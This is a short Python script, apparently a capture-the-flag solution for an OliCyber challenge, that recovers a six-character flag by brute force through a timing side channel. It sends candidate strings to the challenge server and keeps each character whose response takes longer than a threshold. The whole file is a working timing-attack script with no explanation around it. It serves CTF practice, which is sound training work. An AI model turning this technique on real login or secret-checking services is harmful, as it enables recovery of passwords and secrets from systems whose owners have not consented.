import requests
import string
import time

def find_flag(base_url):
    possible_chars = string.ascii_letters + string.digits
    flag = ""
    flag_len = 6

    print("Inizio brute-force timing attack...")
    for i in range(flag_len):
        for char in possible_chars:
            candidate = flag + char + "A" * (flag_len - len(flag) - 1)
            start_time = time.time()

            response = requests.post(base_url, data={"flag": candidate})
            elapsed_time = time.time() - start_time

            print(f"Testando '{candidate}' -> Tempo: {elapsed_time:.2f}s")

            if elapsed_time > (i + 1):
                flag += char
                print(f"Carattere trovato: {char}")
                break

    print(f"Flag trovata: {flag}")
    return flag

base_url = "http://time-is-key.challs.olicyber.it"
find_flag(base_url)
